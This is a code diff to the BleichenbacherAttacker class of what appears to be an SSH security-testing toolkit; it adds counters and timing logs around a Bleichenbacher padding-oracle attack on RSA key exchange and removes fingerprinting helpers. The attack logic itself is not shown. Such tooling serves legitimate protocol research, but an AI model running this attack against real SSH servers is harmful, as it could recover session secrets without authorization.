@@ -13,20 +13,15 @@ import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
 import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
-import de.rub.nds.sshattacker.attacks.general.Vector;
 import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
-import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
 import de.rub.nds.sshattacker.attacks.pkcs1.*;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
-import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
-import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
-import de.rub.nds.sshattacker.core.state.State;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
@@ -65,6 +60,9 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private List<CustomRsaPublicKey> publicKeys = new ArrayList<>();
     private CustomRsaPublicKey serverPublicKey, hostPublicKey;
 
+    private int counterInnerBleichenbacher;
+    private int counterOuterBleichenbacher;
+
     /**
      * @param bleichenbacherConfig Manger attack config
      * @param baseConfig Base config
@@ -88,6 +86,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         setKeyExchangeAlgorithm();
         fullResponseMap = new ArrayList<>();
         this.executor = executor;
+        this.counterInnerBleichenbacher = 0;
+        this.counterOuterBleichenbacher = 0;
     }
 
     /**
@@ -285,11 +285,26 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
             BleichenbacherOracle oracle =
                     new BleichenbacherOracle(
-                            this.hostPublicKey, this.serverPublicKey, getSshConfig());
+                            this.hostPublicKey,
+                            this.serverPublicKey,
+                            getSshConfig(),
+                            counterInnerBleichenbacher,
+                            counterOuterBleichenbacher);
             Bleichenbacher attacker =
                     new Bleichenbacher(
                             encryptedSecret, oracle, this.hostPublicKey, this.serverPublicKey);
+
+            long start = System.currentTimeMillis();
+
             attacker.attack();
+
+            long finish = System.currentTimeMillis();
+            long timeElapsed = finish - start;
+            LOGGER.debug("The attack took {} milliseconds", timeElapsed);
+            LOGGER.debug(
+                    "It took {} tries for the inner and {} tries for the outer Bleichenbacher-Attack",
+                    attacker.getCounterInnerBleichenbacher(),
+                    attacker.getCounterOuterBleichenbacher());
             BigInteger solution = attacker.getSolution();
             /*            BigInteger secret =
             OaepConverter.decodeSolution(
@@ -327,57 +342,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         CONSOLE.info("Decoded Secret: " + secret);*/
     }
 
-    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
-        Pkcs1Vector vector =
-                Pkcs1VectorGenerator.generateCorrectFirstBytePkcs1Vector(
-                        publicKey, getHashLength(), getHashInstance());
-        State state =
-                new State(
-                        sshConfig,
-                        MangerWorkflowGenerator.generateWorkflow(
-                                sshConfig, vector.getEncryptedValue()));
-        FingerPrintTask fingerPrintTask =
-                new FingerPrintTask(
-                        state,
-                        additionalTimeout,
-                        increasingTimeout,
-                        executor.getReexecutions(),
-                        additionalTcpTimeout);
-        FingerprintTaskVectorPair<? extends Vector> stateVectorPair =
-                new FingerprintTaskVectorPair<>(fingerPrintTask, vector);
-
-        executor.bulkExecuteTasks(fingerPrintTask);
-        ResponseFingerprint fingerprint = null;
-        if (stateVectorPair.getFingerPrintTask().isHasError()) {
-            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair);
-        } else {
-            fingerprint = fingerPrintTask.getFingerprint();
-        }
-        return fingerprint;
-    }
-
-    private int getHashLength() {
-        switch (keyExchangeAlgorithm) {
-            case RSA2048_SHA256:
-                return 256;
-            case RSA1024_SHA1:
-                return 160;
-            default:
-                return 0;
-        }
-    }
-
-    private String getHashInstance() {
-        switch (keyExchangeAlgorithm) {
-            case RSA2048_SHA256:
-                return "SHA-256";
-            case RSA1024_SHA1:
-                return "SHA-1";
-            default:
-                return "";
-        }
-    }
-
     private void setKeyExchangeAlgorithm() {
         if (config.getKexAlgorithm() == null) {
             throw new ConfigurationException("The key exchange algorithm must be set.");
@@ -399,41 +363,5 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 new ArrayList<>(Collections.singleton(keyExchangeAlgorithm)));
 
         CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
-    }
-
-    public EqualityError getResultError() {
-        return resultError;
-    }
-
-    public List<VectorResponse> getResponseMapList() {
-        return fullResponseMap;
-    }
-
-    public boolean isErrornousScans() {
-        return erroneousScans;
-    }
-
-    public boolean isIncreasingTimeout() {
-        return increasingTimeout;
-    }
-
-    public void setIncreasingTimeout(boolean increasingTimeout) {
-        this.increasingTimeout = increasingTimeout;
-    }
-
-    public long getAdditionalTimeout() {
-        return additionalTimeout;
-    }
-
-    public void setAdditionalTimeout(long additionalTimeout) {
-        this.additionalTimeout = additionalTimeout;
-    }
-
-    public long getAdditionalTcpTimeout() {
-        return additionalTcpTimeout;
-    }
-
-    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
-        this.additionalTcpTimeout = additionalTcpTimeout;
     }
 }
